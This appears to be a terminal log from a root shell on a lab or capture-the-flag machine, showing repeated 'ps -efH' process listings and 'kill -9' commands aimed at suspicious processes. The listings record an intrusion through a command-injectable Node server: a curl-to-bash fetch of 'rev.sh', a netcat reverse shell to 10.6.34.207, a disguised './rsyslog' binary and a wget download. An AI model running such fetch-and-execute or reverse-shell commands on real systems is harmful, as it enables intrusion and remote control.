mysql     1083     1  0 18:05 ?        00:00:01   /usr/sbin/mysqld
root      1094     1  0 18:05 ?        00:00:00   /usr/lib/policykit-1/polkitd --no-debug
root      1129     1  0 18:05 ?        00:00:00   /usr/sbin/apache2 -k start
jordan    1185  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1188  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1316  1129  0 18:06 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1374  1129  0 18:08 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1477  1129  0 18:11 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1504  1129  0 18:13 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1537  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1538  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1539  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1658  1129  0 18:16 ?        00:00:00     /usr/sbin/apache2 -k start
postgres  1143     1  0 18:05 ?        00:00:00   /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1169  1143  0 18:05 ?        00:00:00     postgres: checkpointer process   
postgres  1170  1143  0 18:05 ?        00:00:00     postgres: writer process   
postgres  1171  1143  0 18:05 ?        00:00:00     postgres: wal writer process   
postgres  1172  1143  0 18:05 ?        00:00:00     postgres: autovacuum launcher process   
postgres  1173  1143  0 18:05 ?        00:00:00     postgres: stats collector process   
root      1273     1  0 18:05 ?        00:00:00   /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1284  1273  0 18:05 ?        00:00:00     /usr/bin/node /home/bunny/simple-command-injection/server.js
root      2364  1284  0 18:34 ?        00:00:00       /bin/sh -c curl http://10.6.34.207:8000/rev.sh | /bin/bash
root      2366  2364  0 18:34 ?        00:00:00         /bin/bash
root      2369  2366  0 18:34 ?        00:00:00           cat /tmp/.thm-jitter
root      2370  2366  0 18:34 ?        00:00:00           /bin/bash -i
root      3656  2370  0 19:00 ?        00:00:00             ps -efH
root      2371  2366  0 18:34 ?        00:00:00           nc 10.6.34.207 32214
root      3263  1284  0 18:50 ?        00:00:00       /bin/sh -c ./rsyslog
root      3264  3263  0 18:50 ?        00:00:00         ./rsyslog
root      3268  3264  0 18:50 ?        00:00:00           /bin/sh
root      1488     1  0 18:12 ?        00:00:00   /usr/bin/systemd-pam
root      1525     1  0 18:14 ?        00:00:01   /usr/lib/snapd/snapd
root      2654     1  0 18:43 ?        00:00:00   /bin/sh
root      2878     1  0 18:46 ?        00:00:00   /lib/systemd/systemd --user
root      2880  2878  0 18:46 ?        00:00:00     (sd-pam)
root      2928     1  0 18:46 ?        00:00:00   wget http://10.6.34.207:8000/disk.tar.enc -O /tmp/disk/disk.tar.pull.enc
root@spacejam:/tmp/.ump# kill -9 3264
kill -9 3264
root@spacejam:/tmp/.ump# .[A.[A
kill -9 3264............ps -efH     .....
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 18:04 ?        00:00:00 [kthreadd]
root         3     2  0 18:04 ?        00:00:00   [ksoftirqd/0]
root         5     2  0 18:04 ?        00:00:00   [kworker/0:0H]
root         7     2  0 18:04 ?        00:00:00   [rcu_sched]
root         8     2  0 18:04 ?        00:00:00   [rcu_bh]
root         9     2  0 18:04 ?        00:00:00   [migration/0]
root        10     2  0 18:04 ?        00:00:00   [watchdog/0]
root        11     2  0 18:04 ?        00:00:00   [kdevtmpfs]
root        12     2  0 18:04 ?        00:00:00   [netns]
root        13     2  0 18:04 ?        00:00:00   [perf]
root        14     2  0 18:04 ?        00:00:00   [xenwatch]
root        15     2  0 18:04 ?        00:00:00   [xenbus]
root        17     2  0 18:04 ?        00:00:00   [khungtaskd]
root        18     2  0 18:04 ?        00:00:00   [writeback]
root        19     2  0 18:04 ?        00:00:00   [ksmd]
root        20     2  0 18:04 ?        00:00:00   [khugepaged]
root        21     2  0 18:04 ?        00:00:00   [crypto]
root        22     2  0 18:04 ?        00:00:00   [kintegrityd]
root        23     2  0 18:04 ?        00:00:00   [bioset]
root        24     2  0 18:04 ?        00:00:00   [kblockd]
root        25     2  0 18:04 ?        00:00:00   [ata_sff]
root        26     2  0 18:04 ?        00:00:00   [md]
root        27     2  0 18:04 ?        00:00:00   [devfreq_wq]
root        28     2  0 18:04 ?        00:00:00   [kworker/u30:1]
root        30     2  0 18:04 ?        00:00:00   [kswapd0]
root        31     2  0 18:04 ?        00:00:00   [vmstat]
root        32     2  0 18:04 ?        00:00:00   [fsnotify_mark]
root        33     2  0 18:04 ?        00:00:00   [ecryptfs-kthrea]
root        49     2  0 18:04 ?        00:00:00   [kthrotld]
root        50     2  0 18:05 ?        00:00:00   [acpi_thermal_pm]
root        51     2  0 18:05 ?        00:00:00   [bioset]
root        52     2  0 18:05 ?        00:00:00   [bioset]
root        53     2  0 18:05 ?        00:00:00   [bioset]
root        54     2  0 18:05 ?        00:00:00   [bioset]
root        55     2  0 18:05 ?        00:00:00   [bioset]
root        56     2  0 18:05 ?        00:00:00   [bioset]
root        57     2  0 18:05 ?        00:00:00   [bioset]
root        58     2  0 18:05 ?        00:00:00   [bioset]
root        59     2  0 18:05 ?        00:00:00   [scsi_eh_0]
root        60     2  0 18:05 ?        00:00:00   [scsi_tmf_0]
root        61     2  0 18:05 ?        00:00:00   [scsi_eh_1]
root        62     2  0 18:05 ?        00:00:00   [scsi_tmf_1]
root        64     2  0 18:05 ?        00:00:00   [bioset]
root        69     2  0 18:05 ?        00:00:00   [ipv6_addrconf]
root        82     2  0 18:05 ?        00:00:00   [bioset]
root        83     2  0 18:05 ?        00:00:00   [deferwq]
root        84     2  0 18:05 ?        00:00:00   [charger_manager]
root       122     2  0 18:05 ?        00:00:00   [bioset]
root       123     2  0 18:05 ?        00:00:00   [bioset]
root       124     2  0 18:05 ?        00:00:00   [bioset]
root       125     2  0 18:05 ?        00:00:00   [bioset]
root       126     2  0 18:05 ?        00:00:00   [bioset]
root       127     2  0 18:05 ?        00:00:00   [bioset]
root       128     2  0 18:05 ?        00:00:00   [bioset]
root       129     2  0 18:05 ?        00:00:00   [bioset]
root       130     2  0 18:05 ?        00:00:00   [kpsmoused]
root       150     2  0 18:05 ?        00:00:00   [ttm_swap]
root       223     2  0 18:05 ?        00:00:00   [kworker/0:1H]
root       231     2  0 18:05 ?        00:00:00   [raid5wq]
root       257     2  0 18:05 ?        00:00:00   [bioset]
root       286     2  0 18:05 ?        00:00:00   [jbd2/xvda1-8]
root       287     2  0 18:05 ?        00:00:00   [ext4-rsv-conver]
root       370     2  0 18:05 ?        00:00:00   [kauditd]
root       391     2  0 18:05 ?        00:00:00   [iscsi_eh]
root       409     2  0 18:05 ?        00:00:00   [ib_addr]
root       420     2  0 18:05 ?        00:00:00   [ib_mcast]
root       421     2  0 18:05 ?        00:00:00   [ib_nl_sa_wq]
root       422     2  0 18:05 ?        00:00:00   [ib_cm]
root       423     2  0 18:05 ?        00:00:00   [iw_cm_wq]
root       424     2  0 18:05 ?        00:00:00   [rdma_cm]
root      1958     2  0 18:24 ?        00:00:00   [kworker/u30:2]
root      2713     2  0 18:45 ?        00:00:00   [kworker/0:5]
root      2873     2  0 18:46 ?        00:00:00   [kworker/0:7]
root      3345     2  0 18:52 ?        00:00:00   [kworker/0:0]
root      3518     2  0 18:57 ?        00:00:00   [kworker/0:1]
root      3644     2  0 18:59 ?        00:00:00   [kworker/0:2]
root         1     0  0 18:04 ?        00:00:10 /sbin/init
root       337     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-journald
root       387     1  0 18:05 ?        00:00:00   /sbin/lvmetad -f
root       417     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-udevd
systemd+   498     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-timesyncd
root       727     1  0 18:05 ?        00:00:00   /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       884     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       885     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       888     1  0 18:05 ?        00:00:00   /usr/sbin/inetd -i
message+   891     1  0 18:05 ?        00:00:00   /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
jordan     894     1  0 18:05 ?        00:00:00   python3 /home/jordan/easyaccess.py
root       907     1  0 18:05 ?        00:00:00   /bin/koth
syslog     917     1  0 18:05 ?        00:00:00   /usr/sbin/rsyslogd -n
root       924     1  0 18:05 ?        00:00:00   /usr/sbin/acpid
daemon     927     1  0 18:05 ?        00:00:00   /usr/sbin/atd -f
root       930     1  0 18:05 ?        00:00:03   /usr/bin/lxcfs /var/lib/lxcfs/
root       940     1  0 18:05 ?        00:00:00   /usr/sbin/cron -f
root       947     1  0 18:05 ?        00:00:00   /usr/lib/accountsservice/accounts-daemon
root       953     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-logind
root       956     1  0 18:05 ?        00:00:00   /usr/lib/snapd/snapd
root       971     1  0 18:05 ?        00:00:00   /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1065     1  0 18:05 ttyS0    00:00:00   /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1067     1  0 18:05 tty1     00:00:00   /sbin/agetty --noclear tty1 linux
root      1077     1  0 18:05 ?        00:00:00   /usr/sbin/sshd -D
root      3738  1077  0 19:01 ?        00:00:00     sshd: root@notty
root      3772  3738  0 19:01 ?        00:00:00       -bash
mysql     1083     1  0 18:05 ?        00:00:01   /usr/sbin/mysqld
root      1094     1  0 18:05 ?        00:00:00   /usr/lib/policykit-1/polkitd --no-debug
root      1129     1  0 18:05 ?        00:00:00   /usr/sbin/apache2 -k start
jordan    1185  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1188  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1316  1129  0 18:06 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1374  1129  0 18:08 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1477  1129  0 18:11 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1504  1129  0 18:13 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1537  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1538  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1539  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1658  1129  0 18:16 ?        00:00:00     /usr/sbin/apache2 -k start
postgres  1143     1  0 18:05 ?        00:00:00   /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1169  1143  0 18:05 ?        00:00:00     postgres: checkpointer process   
postgres  1170  1143  0 18:05 ?        00:00:00     postgres: writer process   
postgres  1171  1143  0 18:05 ?        00:00:00     postgres: wal writer process   
postgres  1172  1143  0 18:05 ?        00:00:00     postgres: autovacuum launcher process   
postgres  1173  1143  0 18:05 ?        00:00:00     postgres: stats collector process   
root      1273     1  0 18:05 ?        00:00:00   /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1284  1273  0 18:05 ?        00:00:00     /usr/bin/node /home/bunny/simple-command-injection/server.js
root      2364  1284  0 18:34 ?        00:00:00       /bin/sh -c curl http://10.6.34.207:8000/rev.sh | /bin/bash
root      2366  2364  0 18:34 ?        00:00:00         /bin/bash
root      2369  2366  0 18:34 ?        00:00:00           cat /tmp/.thm-jitter
root      2370  2366  0 18:34 ?        00:00:00           /bin/bash -i
root      3781  2370  0 19:01 ?        00:00:00             ps -efH
root      2371  2366  0 18:34 ?        00:00:00           nc 10.6.34.207 32214
root      3694  1284  0 19:01 ?        00:00:00       /bin/sh -c ./rsyslog
root      3695  3694  0 19:01 ?        00:00:00         ./rsyslog
root      1488     1  0 18:12 ?        00:00:00   /usr/bin/systemd-pam
root      1525     1  0 18:14 ?        00:00:01   /usr/lib/snapd/snapd
root      2654     1  0 18:43 ?        00:00:00   /bin/sh
root      2878     1  0 18:46 ?        00:00:00   /lib/systemd/systemd --user
root      2880  2878  0 18:46 ?        00:00:00     (sd-pam)
root      2928     1  0 18:46 ?        00:00:00   wget http://10.6.34.207:8000/disk.tar.enc -O /tmp/disk/disk.tar.pull.enc
root      3268     1  0 18:50 ?        00:00:00   /bin/sh
root@spacejam:/tmp/.ump# kill -9 3694
kill -9 3694
root@spacejam:/tmp/.ump# .[A.[A
kill -9 3694............ps -efH     .....
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 18:04 ?        00:00:00 [kthreadd]
root         3     2  0 18:04 ?        00:00:00   [ksoftirqd/0]
root         5     2  0 18:04 ?        00:00:00   [kworker/0:0H]
root         7     2  0 18:04 ?        00:00:00   [rcu_sched]
root         8     2  0 18:04 ?        00:00:00   [rcu_bh]
root         9     2  0 18:04 ?        00:00:00   [migration/0]
root        10     2  0 18:04 ?        00:00:00   [watchdog/0]
root        11     2  0 18:04 ?        00:00:00   [kdevtmpfs]
root        12     2  0 18:04 ?        00:00:00   [netns]
root        13     2  0 18:04 ?        00:00:00   [perf]
root        14     2  0 18:04 ?        00:00:00   [xenwatch]
root        15     2  0 18:04 ?        00:00:00   [xenbus]
root        17     2  0 18:04 ?        00:00:00   [khungtaskd]
root        18     2  0 18:04 ?        00:00:00   [writeback]
root        19     2  0 18:04 ?        00:00:00   [ksmd]
root        20     2  0 18:04 ?        00:00:00   [khugepaged]
root        21     2  0 18:04 ?        00:00:00   [crypto]
root        22     2  0 18:04 ?        00:00:00   [kintegrityd]
root        23     2  0 18:04 ?        00:00:00   [bioset]
root        24     2  0 18:04 ?        00:00:00   [kblockd]
root        25     2  0 18:04 ?        00:00:00   [ata_sff]
root        26     2  0 18:04 ?        00:00:00   [md]
root        27     2  0 18:04 ?        00:00:00   [devfreq_wq]
root        28     2  0 18:04 ?        00:00:00   [kworker/u30:1]
root        30     2  0 18:04 ?        00:00:00   [kswapd0]
root        31     2  0 18:04 ?        00:00:00   [vmstat]
root        32     2  0 18:04 ?        00:00:00   [fsnotify_mark]
root        33     2  0 18:04 ?        00:00:00   [ecryptfs-kthrea]
root        49     2  0 18:04 ?        00:00:00   [kthrotld]
root        50     2  0 18:05 ?        00:00:00   [acpi_thermal_pm]
root        51     2  0 18:05 ?        00:00:00   [bioset]
root        52     2  0 18:05 ?        00:00:00   [bioset]
root        53     2  0 18:05 ?        00:00:00   [bioset]
root        54     2  0 18:05 ?        00:00:00   [bioset]
root        55     2  0 18:05 ?        00:00:00   [bioset]
root        56     2  0 18:05 ?        00:00:00   [bioset]
root        57     2  0 18:05 ?        00:00:00   [bioset]
root        58     2  0 18:05 ?        00:00:00   [bioset]
root        59     2  0 18:05 ?        00:00:00   [scsi_eh_0]
root        60     2  0 18:05 ?        00:00:00   [scsi_tmf_0]
root        61     2  0 18:05 ?        00:00:00   [scsi_eh_1]
root        62     2  0 18:05 ?        00:00:00   [scsi_tmf_1]
root        64     2  0 18:05 ?        00:00:00   [bioset]
root        69     2  0 18:05 ?        00:00:00   [ipv6_addrconf]
root        82     2  0 18:05 ?        00:00:00   [bioset]
root        83     2  0 18:05 ?        00:00:00   [deferwq]
root        84     2  0 18:05 ?        00:00:00   [charger_manager]
root       122     2  0 18:05 ?        00:00:00   [bioset]
root       123     2  0 18:05 ?        00:00:00   [bioset]
root       124     2  0 18:05 ?        00:00:00   [bioset]
root       125     2  0 18:05 ?        00:00:00   [bioset]
root       126     2  0 18:05 ?        00:00:00   [bioset]
root       127     2  0 18:05 ?        00:00:00   [bioset]
root       128     2  0 18:05 ?        00:00:00   [bioset]
root       129     2  0 18:05 ?        00:00:00   [bioset]
root       130     2  0 18:05 ?        00:00:00   [kpsmoused]
root       150     2  0 18:05 ?        00:00:00   [ttm_swap]
root       223     2  0 18:05 ?        00:00:00   [kworker/0:1H]
root       231     2  0 18:05 ?        00:00:00   [raid5wq]
root       257     2  0 18:05 ?        00:00:00   [bioset]
root       286     2  0 18:05 ?        00:00:00   [jbd2/xvda1-8]
root       287     2  0 18:05 ?        00:00:00   [ext4-rsv-conver]
root       370     2  0 18:05 ?        00:00:00   [kauditd]
root       391     2  0 18:05 ?        00:00:00   [iscsi_eh]
root       409     2  0 18:05 ?        00:00:00   [ib_addr]
root       420     2  0 18:05 ?        00:00:00   [ib_mcast]
root       421     2  0 18:05 ?        00:00:00   [ib_nl_sa_wq]
root       422     2  0 18:05 ?        00:00:00   [ib_cm]
root       423     2  0 18:05 ?        00:00:00   [iw_cm_wq]
root       424     2  0 18:05 ?        00:00:00   [rdma_cm]
root      1958     2  0 18:24 ?        00:00:00   [kworker/u30:2]
root      2713     2  0 18:45 ?        00:00:00   [kworker/0:5]
root      2873     2  0 18:46 ?        00:00:00   [kworker/0:7]
root      3345     2  0 18:52 ?        00:00:00   [kworker/0:0]
root      3518     2  0 18:57 ?        00:00:00   [kworker/0:1]
root      3644     2  0 18:59 ?        00:00:00   [kworker/0:2]
root         1     0  0 18:04 ?        00:00:10 /sbin/init
root       337     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-journald
root       387     1  0 18:05 ?        00:00:00   /sbin/lvmetad -f
root       417     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-udevd
systemd+   498     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-timesyncd
root       727     1  0 18:05 ?        00:00:00   /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       884     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       885     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       888     1  0 18:05 ?        00:00:00   /usr/sbin/inetd -i
message+   891     1  0 18:05 ?        00:00:00   /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
jordan     894     1  0 18:05 ?        00:00:00   python3 /home/jordan/easyaccess.py
root       907     1  0 18:05 ?        00:00:00   /bin/koth
syslog     917     1  0 18:05 ?        00:00:00   /usr/sbin/rsyslogd -n
root       924     1  0 18:05 ?        00:00:00   /usr/sbin/acpid
daemon     927     1  0 18:05 ?        00:00:00   /usr/sbin/atd -f
root       930     1  0 18:05 ?        00:00:03   /usr/bin/lxcfs /var/lib/lxcfs/
root       940     1  0 18:05 ?        00:00:00   /usr/sbin/cron -f
root       947     1  0 18:05 ?        00:00:00   /usr/lib/accountsservice/accounts-daemon
root       953     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-logind
root       956     1  0 18:05 ?        00:00:00   /usr/lib/snapd/snapd
root       971     1  0 18:05 ?        00:00:00   /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1065     1  0 18:05 ttyS0    00:00:00   /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1067     1  0 18:05 tty1     00:00:00   /sbin/agetty --noclear tty1 linux
root      1077     1  0 18:05 ?        00:00:00   /usr/sbin/sshd -D
root      3738  1077  0 19:01 ?        00:00:00     sshd: root@notty
root      3772  3738  0 19:01 ?        00:00:00       -bash
mysql     1083     1  0 18:05 ?        00:00:01   /usr/sbin/mysqld
root      1094     1  0 18:05 ?        00:00:00   /usr/lib/policykit-1/polkitd --no-debug
root      1129     1  0 18:05 ?        00:00:00   /usr/sbin/apache2 -k start
jordan    1185  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1188  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1316  1129  0 18:06 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1374  1129  0 18:08 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1477  1129  0 18:11 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1504  1129  0 18:13 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1537  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1538  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1539  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1658  1129  0 18:16 ?        00:00:00     /usr/sbin/apache2 -k start
postgres  1143     1  0 18:05 ?        00:00:00   /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1169  1143  0 18:05 ?        00:00:00     postgres: checkpointer process   
postgres  1170  1143  0 18:05 ?        00:00:00     postgres: writer process   
postgres  1171  1143  0 18:05 ?        00:00:00     postgres: wal writer process   
postgres  1172  1143  0 18:05 ?        00:00:00     postgres: autovacuum launcher process   
postgres  1173  1143  0 18:05 ?        00:00:00     postgres: stats collector process   
root      1273     1  0 18:05 ?        00:00:00   /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1284  1273  0 18:05 ?        00:00:00     /usr/bin/node /home/bunny/simple-command-injection/server.js
root      2364  1284  0 18:34 ?        00:00:00       /bin/sh -c curl http://10.6.34.207:8000/rev.sh | /bin/bash
root      2366  2364  0 18:34 ?        00:00:00         /bin/bash
root      2369  2366  0 18:34 ?        00:00:00           cat /tmp/.thm-jitter
root      2370  2366  0 18:34 ?        00:00:00           /bin/bash -i
root      3783  2370  0 19:01 ?        00:00:00             ps -efH
root      2371  2366  0 18:34 ?        00:00:00           nc 10.6.34.207 32214
root      1488     1  0 18:12 ?        00:00:00   /usr/bin/systemd-pam
root      1525     1  0 18:14 ?        00:00:01   /usr/lib/snapd/snapd
root      2654     1  0 18:43 ?        00:00:00   /bin/sh
root      2878     1  0 18:46 ?        00:00:00   /lib/systemd/systemd --user
root      2880  2878  0 18:46 ?        00:00:00     (sd-pam)
root      2928     1  0 18:46 ?        00:00:00   wget http://10.6.34.207:8000/disk.tar.enc -O /tmp/disk/disk.tar.pull.enc
root      3268     1  0 18:50 ?        00:00:00   /bin/sh
root      3695     1  0 19:01 ?        00:00:00   ./rsyslog
root@spacejam:/tmp/.ump# 